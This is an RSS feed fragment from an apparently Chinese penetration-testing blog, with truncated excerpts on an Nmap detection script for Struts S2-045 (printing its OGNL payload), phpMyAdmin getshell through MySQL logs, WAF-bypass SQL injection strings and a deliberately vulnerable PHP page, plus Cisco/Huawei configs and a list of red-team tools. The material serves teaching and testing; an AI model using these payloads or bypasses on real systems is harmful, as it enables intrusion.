Nmap最灵活的就是它的scripts了，在渗透测试中我们经常会用它来扫描服务、漏洞，而且很多脚本也可以用于漏洞利用，总之就是很强大啦～ 具体的介绍在这里：Nmap脚本使用指南
看过《Nmap渗透指南》一书，发现书中对于Nmap脚本的编写是轻描淡写，所以本文就利用一个漏洞实例给大家详细说说这个脚本如何开发的。 PS：并没有说这本书不好，其实很好很好的。
0x01 实战编写前的思路 今天我用Struts S2-045这个漏洞来编写一个漏洞检测脚本。
PS：此文需要一点Lua语言基础。我也就看了个半调子 ，才写的这个文章，Lua大牛误喷。
思路： 它主要是给服务器端发送一个http请求，这个请求里的Content-type中就是我们的利用代码了。在这里可以称之为Payload。
相关链接：Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法
我们先把Payload拿出来：
1 %{(#nikenb=&amp;#39;multipart/form-data&amp;#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(&amp;#39;YES&amp;#39;)).(#o.close())} 可以看到有一个YES，当服务器端相应YES的时候，我们就判定这个服务器存在此漏洞。
根据官方的文档，我们先载入指定的扩展库：
1 2 3 4 5 6 7 8 9 10 11 12 -- -- Created by IntelliJ IDEA. -- User: liyingzhe -- Date: 17-6-3 -- Time: 上午2:07 -- To change this template use File | Settings | File Templates. -- local http = require &amp;#34;http&amp;#34; local shortport = require &amp;#34;shortport&amp;#34; local stdnse = require &amp;#34;stdnse&amp;#34; local string = require &amp;#34;string&amp;#34; local vulns = require &amp;#34;vulns&amp;#34; 这些基本用于发送HTTP请求、字符串操作、漏洞结果生成、错误调试</description></item><item><title>phpMyAdmin新姿势getshell</title><link>https://payloads.online/archivers/2017-03-05/1/</link><pubDate>Thu, 23 Mar 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-03-05/1/</guid><description>0x00 设想 假设我们拥有MySQL的root权限，登录Web端的phpMyAdmin数据库管理控制台，你有多少种方法去getshell？
本文旨在研究新的方法，如果在INTO OUTFILE禁用的情况下，或许会少很多思路了。
这里的禁用是完全（权限）禁用，而不是拦截行为。
0x01 常规方法测试 好了，入正题，我目前拥有一台WIN XP虚拟机，上面的服务如下：
Apache 2.4.23（此环境与本文实现的攻击关系不大） PHP 5.4.45（此环境与本文实现的攻击关系不大） phpMyAdmin 4.6.6（此环境与本文实现的攻击关系不大） MySQL 5.5.53 - MySQL Community Server (GPL) （5.0以上） 绝对路径：C:\phpStu\WWW\ 目前大部分站点都使用了MySQL 5.0以上的版本
我们先尝试一下使用SQL表达式INTO OUTFILE 去getshell：
可以看到已经被阻止了 ，具体原因我们在这里讲一下：
错误提示
1 #1290 - The MySQL server is running with the --secure-file-priv option so it cannot execute this statement. secure-file-priv这个全局变量是指定文件夹作为导出文件存放的地方，默认情况下，secure-file-priv是一个空值（NULL）。我们现在设置为网站的根目录，再去尝试使用INTO OUTFILE getshell。
但是在我们使用SQL修改的时候，发现这个值是只读的。
经过查阅资料知道，这个值只能通过修改MySQL的配置文件来达到修改的目的。
0x02 新姿势测试 这些希望破灭以后我并没有沮丧，我相信这些研究都是有用的，有助于我的思考。
于是把目光转向了MySQL的特性，开始测试MySQL全局变量对MySQL本身的影响。
最后我发现MySQL 5.0+的版本会自动创建日志文件，那么在服务运行的情况下修改全局变量也是可以变动文件位置的，但是必须要对生成日志的目录有可读可写的权限。（Linux环境下可能会比较苛刻，因为站点目录是一个用户，MySQL是另外一个用户，权限管控较为严格，主要取决于权限配置是否得当）
OK，不废话，开始测试~~
首先呢，介绍两个MySQL全局变量（general_log、general_log file）
general log 指的是日志保存状态，一共有两个值（ON/OFF）ON代表开启 OFF代表关闭。 general log file 指的是日志的保存路径。 我们先查看一下全局变量 ~</description></item><item><title>渗透测试中的Bypass技巧（四）自动化注入</title><link>https://payloads.online/archivers/2017-03-10/2/</link><pubDate>Mon, 13 Mar 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-03-10/2/</guid><description>0x01 简单测试 列举一下常见的WAF：
安全狗 云锁 护卫神 D盾 360网站卫士 百度云加速 阿里云云盾 环境：
WAF：某锁最新版本3.1.6 系统:windows 2003 WEB服务器：apache2.4.23 Php版本：php5.4.45 Mysql：5.5.53 PHP SQL注入页面代码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 &amp;lt;?php $link = mysql_connect(&amp;#39;127.0.0.1&amp;#39;,&amp;#39;root&amp;#39;,&amp;#39;root&amp;#39;)or die(&amp;#39;Mysql Cannot Connect&amp;#39;); mysql_select_db(&amp;#39;qq&amp;#39;); $id = isset($_REQUEST[&amp;#39;id&amp;#39;])?$_REQUEST[&amp;#39;id&amp;#39;]:1; $sql=&amp;#34;select * from qq where id = &amp;#34;.$id; echo $sql.&amp;#39;&amp;lt;hr&amp;gt;&amp;#39;; if(!$result = mysql_query($sql)){ exit(mysql_error($link)); } $data = mysql_fetch_assoc($result); echo &amp;#39;ID = &amp;#39;.</description></item><item><title>渗透测试中的Bypass技巧（三）自动化注入</title><link>https://payloads.online/archivers/2017-03-10/1/</link><pubDate>Tue, 07 Mar 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-03-10/1/</guid><description>0x00 匹配资源大小限制 某些Web服务器的特性不一，导致WAF在判断时候无法完全工作。经常出现的情况大部分都是协议层与Web服务器之间WAF没有很好的处理请求，导致无法拦截很多生僻的攻击手法，那么我们先从GET、POST先说起。
Get方法提交的数据大小长度并没有限制，HTTP协议规范没有对URL长度进行限制。这个限制是特定的浏览器及服务器对它的限制。可见WAF可能在处理GET请求的时候，根据客户端（浏览器）规定的长度去匹配了，这就造成了一个缺陷。我们可以把有效数据放在这个限制的零界点，攻击语句放在零界点后方，让WAF以为这是一个正常请求，就随之放行，达到了攻击效果。
理论上讲，POST是没有大小限制的。HTTP协议规范也没有进行大小限制，起限制作用的是服务器的处理程序的处理能力。
例如在使用PHP进行POST提交时，文件大小受PHP配置文件PHP.INI限制，我们可以修改PHP.INI文件中的post_max_size参数，可将默认的2M字节，修改自己需要的大小，但由于HTTP协议的特性，这个值不宜设置过大，最大以8M为宜。假设如果服务器端设置了8M，而WAF默认只匹配2M，由此可见服务器端接受数据的大小&amp;gt;WAF匹配的数据最大大小。那么，我们可以根据上述方法，也可绕过WAF的拦截。
0x01 绕过某WAF上传 渗透测试中的Bypass技巧（二） - 知乎专栏
在上一章中我们已经举例了一个bypass上传，最重要的彩蛋就在Bypass注入啦~
0x02 绕过某WAF注入 我们构造一个SQL注入页面，慢慢去研究它的拦截规则：
先从普通的语句开始做定位：
and 1=1
and ‘s’=’s’
union select 1,2,3
union/**/select/**/user(),2,3
&amp;hellip;&amp;hellip;
等价替换
And ‘s’ like ‘s’
此时我们已经可以使用like用于盲注（此时可以将所有的 = 替换成 Like ）
注释 我们可以设想出拦截的特征正则
union与select同时出现会被拦截，union[空格,%20,/*部分字符*/]select都会被拦截，目前普通的union select都会被拦截，既然空格,%20都会被匹配到，我们只能通过/**/内联来注释了（目前发现N多姿势，在这里只共享思路+一个bypass的tamper脚本）
/**/
/*数字+字母*/
/*特殊符号+数字+字母*/
&amp;hellip;..more
假设union左右如果有select就拦截的话，那么定位union与select之间的敏感字符就好，假设union[空格]select，此时如果把空格替换成任意内联，就可bypass这个规则，此时规则也不可能是一条的。条件也是很多的。我们也只能讲内联这个规则做手脚了。
于是乎我发现/*^xxx^xxx*/字母加特殊字符即可bypass。
因为每个特征中都没有匹配到^与小写字母、大写字母、数字的组合，这些条件可以继续测试，笔者已经把此文写到最佳精简，测试期间也翻看过拦截日志，定位拦截特征。
（Union注入）例如在读取：mysql密码、表名的时候，我们还会查询information_schema数据库，这个可以转换大小写，或者在information_schema.TABLES直接再添加一个注释。下面就是测试过程：首先测试简单的and 1=1
然后我们使用注释bypass:
此时已经bypass成功了，我在这里用的是某dog 4.0（3.5也可以）
0x03 自动化bypass注入 我们通过编写sqlmap的tamper用于bypass，主要是需要定位各种拦截点，使用sqlmap替换Payload。
首先在sqlmap的tamper文件夹里创建一个safedog.py，编写我们的tamper脚本
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!</description></item><item><title>渗透测试中的Bypass技巧（二）</title><link>https://payloads.online/archivers/2017-03-06/1/</link><pubDate>Mon, 06 Mar 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-03-06/1/</guid><description>0x01 HTTP不同的请求方法污染 方法 解释 GET 请求指定的页面信息，并返回实体主体。 HEAD 类似于GET请求，只不过返回的响应中没有具体的内容，用于获取报头 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 PUT 从客户端向服务器传送的数据取代指定的文档的内容。 DELETE 请求服务器删除指定的页面。 CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 OPTIONS 允许客户端查看服务器的性能。 TRACE 回显服务器收到的请求，主要用于测试或诊断。 我们可以先看一个请求：
可见是一个GET请求，此服务器是一个Apache+PHP的环境。
假设服务器只拦截GET/POST请求，那么根据Apache服务器的特性，发送其他请求只要脚本接收的是GET参数，那么也是可以传递参数值的。
如图：
此知识点需要先知道各个Web服务器环境的特性，然后再针对特性去做测试。
0x02 GET与POST的区别 Http定义了与服务器交互的不同方法，最基本的方法有4种，分别是GET，POST，PUT，DELETE。URL全称是资源描述符，我们可以这样认为：一个URL地址，它用于描述一个网络上的资源，而HTTP中的GET，POST，PUT，DELETE就对应着对这个资源的查，改，增，删4个操作。到这里，大家应该有个大概的了解了，GET一般用于获取/查询资源信息，而POST一般用于更新资源信息。
在网上已经有很多朋友写过了其问题的答案，但是对于WAF，我们就要转变角度去看了，第一点就是要看数据包的区别。
1 2 3 4 5 6 7 8 9 10 GET /sql/index2.php?id=2 HTTP/1.1 Host: 192.168.1.102 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Cookie: yunsuo_session_verify=a89786c1a180124a6820b6387b85b693 Connection: keep-alive Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 POST /sql/search.</description></item><item><title>渗透测试中的Bypass技巧（一）</title><link>https://payloads.online/archivers/2017-03-05/1/</link><pubDate>Sun, 05 Mar 2017 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2017-03-05/1/</guid><description>0x00 前言 许多朋友在渗透测试中因为遇到WAF而束手无策，本人应邀，与godkiller一同写下此文，希望能够对许多朋友的问题有所帮助。
此系列一共分为五篇文章，分别如下：
一、架构层绕过WAF CDN WAF绕过
白名单应用
二、匹配资源大小限制 服务器端配置（Data MAX Length）
协议未正确解析
HTTP不同的请求方法污染
GET与POST的区别
文件上传
HTTP参数污染（HPP)
四、发现WAF缺陷过程 绕过某WAF上传
绕过某WAF注入
自动化Bypass
思考
五、过滤/拦截规则不严谨 等价替换
大小写替换
不常用条件
特殊符号
编码
注释
0x01 CDN WAF绕过 CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。 &amp;ndash;来源“百度”
目前CDN服务的功能是越来越多，安全性也越加强悍，用户的每个请求都会被发送到指定的CDN节点上，最后转发给真实站点。这个过程就好像加了一道关卡，这个关卡提供了缓存、加速、防御的特点。
在渗透测试中，如果遇到了CDN站点，几乎许多测试请求都会被CDN拦截，甚至多次请求后，会被加入黑名单。这个CDN节点属于云端WAF，如果将数据直接发送给真实站点，那么也就没有CDN的处理了，整个防御就没有任何作用。
那么下面我来带给大家几个方法来绕过云端WAF。首先我们必须要查询到目标站点的真实地址才可以，这里的真实地址就指的是真实IP。以下几个方法只是个人之见，如果有遗漏或者缺点，请在文章评论指出……
第一个，查询域名历史DNS解析，网上有很多站点都可以查询站点的历史DNS解析。假设我在本月10号，域名绑定的服务器IP是199.199.199.***，在下月15号更换了服务器的IP，那么这个199.199.199.***可能就会被直接记录在历史记录中。再根据历史记录进行判断当前IP是否是现在的网站真实服务器地址。
第二个，查看子域名解析地址是否和主域名的IP地址相近。一般再查询域名是否存在CDN的话，我们可以看响应头、或者看解析记录，里面大多都有关于云端CDN的字眼。当然提倡写脚本，Kali Linux中也有工具 ~
第三个，社工DNS 比较苛刻，需要拿到CDN那边的管理员权限开可以。
第四个，CDN节点分发缺陷，通过国外IP访问网站可能会出现真实IP，因为有的CDN服务商可能只做了国内节点，没做国外的，这样访问请求是直接被转发到真实服务器地址上。
那么下面来概述一下得到了绕过的条件如何进行绕过，假设服务器端的IP地址为121.121.1x1.1x1，管理员设置了CDN节点，经过上面的方法得到真实IP地址后，可以直接更改本地的hosts文件来直接将数据发送到网站服务器上。这里不再详细概述啦~
0x02 白名单应用（子域名） 在有些时候，某些厂商的环境刚刚上线，用于调试项目，并没有直接将子域名添加至CDN节点，那么就有可能出现某些安全隐患，因为刚上线的项目都没有任何防御措施，如果当前项目与目标站点搭建在同一个服务器中，也会成为我们绕过WAF的有利条件。当然白名单应用不止一个上线项目，还有某些管理应用，例如：phpmyadmin，其操作完全不会被WAF拦截，当然应用过多，本人不才，只接触一些常见的，欢迎补充。
感谢大家的支持。</description></item><item><title>思科路由</title><link>https://payloads.online/archivers/2015-11-23/1/</link><pubDate>Mon, 23 Nov 2015 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2015-11-23/1/</guid><description>本文介绍一下思科设备的简单配置
0x01 0x01 思科RIP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 Router5: Router&amp;gt;en Router#conf t Router(config)#int FastEthernet 0/1 Router(config-if)#no shutdown Router(config-if)#ip add 172.</description></item><item><title>华为MSTP协议</title><link>https://payloads.online/archivers/2015-11-20/6/</link><pubDate>Fri, 20 Nov 2015 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2015-11-20/6/</guid><description>本文记录一下华为MSTP协议配置
1.创建四个VLAN在四个交换机上,分别是 10 20 30 40。
2.分别设置trunk链路
3.进入STP配置视图
4.设置域名和修订级别
5.创建两个实例
6.激活实例
7.设置实例的优先级别，指定实例的根桥
0x01 创建四个VLAN 1 2 3 4 &amp;lt;Huawei&amp;gt;sys [Huawei]vlan batch 10 20 30 40 0x02 分别设置trunk链路 1 2 3 4 5 6 [Huawei]port-group group-member e 0/0/1 to e 0/0/2 [Huawei-port-group]port link-type trunk [Huawei-port-group]port trunk allow-pass vlan all 说明：在每个交换机都要创建四个VLAN、并且都设置trunk链路
0x03 进入STP配置视图 1 2 [Huawei]stp region-configuration 0x04 创建域名以及修订级别 1 2 3 4 [Huawei-mst-region]region-name xinhua [Huawei-mst-region]revision-level 1 0x05 创建两个实例分别加入vlan 1 2 3 4 [Huawei-mst-region]instance 1 vlan 10 20 [Huawei-mst-region]instance 2 vlan 30 40 0x06 激活实例 1 2 [Huawei-mst-region]active region-configuration 0x07 设置实例的优先级别、指定实例根桥 首先查看一下LSW3：</description></item><item><title>华为交换机MUX-VLAN</title><link>https://payloads.online/archivers/2015-11-20/5/</link><pubDate>Fri, 20 Nov 2015 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2015-11-20/5/</guid><description>本文记录一下华为交换机MUX-VLAN配置
0x11 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 &amp;lt;Huawei&amp;gt;sys [Huawei]vlan batch 100 20 30 10 提示：此操作可能耗时较长。请稍等…完成。 [Huawei]port-group group-member e0/0/2 to e0/0/4 [Huawei-port-group]port link-type access [Huawei-Ethernet0/0/2]port link-type access [Huawei-Ethernet0/0/3]port link-type access [Huawei-Ethernet0/0/4]port link-type access [Huawei-port-group]port default vlan 100 [Huawei-Ethernet0/0/2]port default vlan 100 [Huawei-Ethernet0/0/3]port default vlan 100 [Huawei-Ethernet0/0/4]port default vlan 100 [Huawei]port-group group-member e 0/0/5 to e0/0/6 [Huawei-port-group]port link-type access [Huawei-Ethernet0/0/5]port link-type access [Huawei-Ethernet0/0/6]port link-type access [Huawei-port-group]port default vlan 10 [Huawei-Ethernet0/0/5]port default vlan 10 [Huawei-Ethernet0/0/6]port default vlan 10 [Huawei-port-group]q [Huawei]int e0/0/20 [Huawei-Ethernet0/0/20]port link-type access [Huawei-Ethernet0/0/20]port default vlan 20 [Huawei-Ethernet0/0/20]int e0/0/1 [Huawei-Ethernet0/0/1]port link-type access [Huawei-Ethernet0/0/1]port default vlan 30 [Huawei-Ethernet0/0/1]q [Huawei]vlan 30 [Huawei-vlan30]mux-vlan [Huawei-vlan30]subordinate group 10 20 [Huawei-vlan30]subordinate separate 100 [Huawei]port-group group-member e0/0/1 to e0/0/22 [Huawei-port-group]port mux-vlan enable [Huawei-Ethernet0/0/1]port mux-vlan enable [Huawei-Ethernet0/0/2]port mux-vlan enable [Huawei-Ethernet0/0/3]port mux-vlan enable [Huawei-Ethernet0/0/4]port mux-vlan enable [Huawei-Ethernet0/0/5]port mux-vlan enable [Huawei-Ethernet0/0/6]port mux-vlan enable [Huawei-port-group]q &amp;lt;Huawei&amp;gt;save 将把当前的配置保存到存储设备中。</description></item><item><title>华为交换机Telnet远程登录</title><link>https://payloads.online/archivers/2015-11-20/1/</link><pubDate>Fri, 20 Nov 2015 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2015-11-20/1/</guid><description>本文记录一下华为交换机Telnet远程登录的简单配置
0x05 交换机：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 &amp;lt;Huawei&amp;gt;sys [Huawei]user-interface vty 0 4 [Huawei-ui-vty0-4]authentication-mode aaa [Huawei-ui-vty0-4]q [Huawei-aaa]local-user admin password simple?123456 [Huawei-aaa]local-user admin privilege? level 3 [Huawei-aaa]local-user admin service-type telnet [Huawei-aaa]q [Huawei]int vlan 1 [Huawei-Vlanif1]ip address 192.168.1.1 24 路由器：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 &amp;lt;Huawei&amp;gt;sys [Huawei]int G 0/0/0 [Huawei-GigabitEthernet0/0/0]ip add [Huawei-GigabitEthernet0/0/0]ip address 192.</description></item><item><title>华为交换机VLAN聚合实例</title><link>https://payloads.online/archivers/2015-11-20/4/</link><pubDate>Fri, 20 Nov 2015 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2015-11-20/4/</guid><description>本文记录一下华为交换机VLAN聚合实例配置
创建VLAN聚合的VLAN 设置VLAN聚合所需要的trunk链路 划分VLAN 配置三层交换机的VLAN聚合 配置聚合VLAN的IP 开启ARP代理 配置客户机IP地址及网关 测试 0x01 创建VLAN聚合的VLAN 1 2 3 4 &amp;lt;Huawei&amp;gt;sys [Huawei]vlan batch 10 20 30 注：vlan的个数必须相同
0x02 设置VLAN聚合所需要的trunk链路 1 2 3 4 5 6 7 8 9 10 11 12 [Huawei]int g0/0/1 [Huawei-GigabitEthernet0/0/1]port link-type trunk [Huawei-GigabitEthernet0/0/1]port trunk allow-pass vlan 10 20 [Huawei]port-group group-member e0/0/1 e0/0/2 [Huawei-port-group]port link-type trunk [Huawei-port-group]port trunk allow-pass vlan 10 20 注：Trunk链路不需要allow Vlan聚合的vlan
0x03 划分VLAN 1 2 3 4 5 6 7 8 9 10 11 12 [Huawei-GigabitEthernet0/0/1]int g0/0/2 [Huawei-GigabitEthernet0/0/2]port link-type access [Huawei-GigabitEthernet0/0/2]port default vlan 10 [Huawei-GigabitEthernet0/0/2]int g0/0/3 [Huawei-GigabitEthernet0/0/3]port link-type access [Huawei-GigabitEthernet0/0/3]port default vlan 20 0x04 配置三层交换机的VLAN聚合 1 2 3 4 5 6 7 8 9 10 11 [Huawei]vlan 30 [Huawei-vlan30]aggregate-vlan [Huawei-vlan30]access-vlan 10 20 [Huawei-Vlanif30]ip address 192.</description></item><item><title>华为路由OSPF被动接口配置</title><link>https://payloads.online/archivers/2015-11-20/3/</link><pubDate>Fri, 20 Nov 2015 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2015-11-20/3/</guid><description>本文记录一下华为路由OSPF被动接口配置
拓扑图：
0x08 AR1配置命令：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 &amp;lt;Huawei&amp;gt;sys Enter system view, return user view with Ctrl+Z. [Huawei]sysname AR1 [AR1]int G0/0/0 [AR1-GigabitEthernet0/0/0]ip add 192.168.4.1 24 [AR1-GigabitEthernet0/0/0]int G0/0/1 [AR1-GigabitEthernet0/0/1]ip add 192.168.6.1 24 [AR1-GigabitEthernet0/0/1]int G0/0/2 [AR1-GigabitEthernet0/0/2]ip add 192.168.5.1 24 [AR1-GigabitEthernet0/0/2]q [AR1]ospf [AR1-ospf-1]area 0 [AR1-ospf-1-area-0.</description></item><item><title/><link>https://payloads.online/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://payloads.online/about/</guid><description>About POLOXUE - 十三年编程经验的程序员一枚。
我的社交媒体：掘金，知乎，CSDN</description></item><item><title/><link>https://payloads.online/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://payloads.online/readme/</guid><description>cnposts 中文博客内容</description></item><item><title>About</title><link>https://payloads.online/about/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://payloads.online/about/</guid><description> ID：倾旋 / Rvn0xsy GitHub.</description></item><item><title>Projects</title><link>https://payloads.online/projects/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://payloads.online/projects/</guid><description> Cooolis-ms | Cooolis-ms是一个包含了Metasploit Payload Loader、Cobalt Strike External C2 Loader、Reflective DLL injection的代码执行工具，它的定位在于能够在静态查杀上规避一些我们将要执行且含有特征的代码，帮助红队人员更方便快捷的从Web容器环境切换到C2环境进一步进行工作。 BadCode | 恶意代码逃逸源代码 静态恶意代码逃逸（第一课） 静态恶意代码逃逸（第二课） 静态恶意代码逃逸（第三课） 静态恶意代码逃逸（第四课） 静态恶意代码逃逸（第五课） 静态恶意代码逃逸（第六课） 静态恶意代码逃逸（第七课） 静态恶意代码逃逸（第八课） 静态恶意代码逃逸（第九课） 静态恶意代码逃逸（第十课） PDacl | 利用C++实现Windows下ACL修改、增加。相关阅读：Windows权限控制相关的防御与攻击技术 OXID-Find | 通过OXID解析器获取Windows远程主机上网卡地址 Linco2 | 模拟Cobalt Strike的Beacon与C2通信过程，实现了基于HTTP协议的Linux C2 Cobaltstrike-atexec | 使得Cobaltstrike支持Atexec nse_vuln | Nmap扫描、漏洞利用脚本 CVE-2021-3156-plus | CVE-2021-3156 非交互式执行命令 MyWin32CPP | 记录一下我学习的Win32CPP Pricking | Pricking 是一个自动化部署水坑和网页钓鱼的项目 想要了解更多可以阅读：
红队技巧：基于反向代理的水坑攻击 Pricking 项目（一） ：使用介绍 Pricking 项目（二） ：JS模块开发 Blowbeef | 使用C++语言连接WMI接口进行信息收集 red-tldr | red-tldr 是一个轻量级的文本搜索工具，它用于帮助红队工作人员快速的寻找到想要执行的命令、关键点，因此它比较适用于有一定经验的红队人员使用。</description></item><item><title>友情链接</title><link>https://payloads.online/links/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://payloads.online/links/</guid><description>晏子霜&amp;rsquo;s blog 三米前有蕉皮&amp;rsquo;s blog Key&amp;rsquo;s blog Akkuman&amp;rsquo;s blog Wolvez&amp;rsquo;s blog SYM01&amp;rsquo;s blog Evi1cg&amp;rsquo;s blog 澄澈少年的网络小站 需要添加请发送邮件至：rvn0xsy@gmail.com</description></item><item><title>留言</title><link>https://payloads.online/message/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://payloads.online/message/</guid><description>🙋🏻‍♂️这里是网站的 留言板页面 , 你可以直接在这里留下你想说的话~</description></item><item><title>赞助</title><link>https://payloads.online/sponsor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://payloads.online/sponsor/</guid><description>💖如果我的文章对你有帮助，可以请我喝一杯咖啡～</description></item></channel></rss>